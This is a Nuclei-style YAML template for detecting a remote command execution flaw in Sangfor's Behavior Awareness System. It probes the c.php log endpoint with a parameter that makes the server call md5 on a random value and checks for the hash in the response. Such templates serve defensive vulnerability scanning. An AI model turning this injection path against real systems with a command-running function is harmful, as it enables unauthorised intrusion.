id: sangfor-bahavior-awareness-rce
info:
  name: Sangfor Behavior Awareness System RCE
  author: ProjectDiscoveryAI
  severity: high
  description: |
    Detects remote command execution vulnerability in Sangfor Behavior Awareness System based on specific response behavior.
  reference:
    - http://wiki.peiqi.tech/PeiQi_Wiki/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E6%B7%B1%E4%BF%A1%E6%9C%8D/%E6%B7%B1%E4%BF%A1%E6%9C%8D%20%E6%97%A5%E5%BF%97%E4%B8%AD%E5%BF%83%20c.php%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.html

variables:
  random_value: "{{rand_text_alphanumeric(8)}}"

http:
  - method: GET
    path:
      - "{{BaseURL}}/tool/log/c.php?strip_slashes=md5&host={{random_value}}"
    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "text/html"
        part: header
      - type: word
        words:
          - "{{md5(random_value)}}"
        part: body
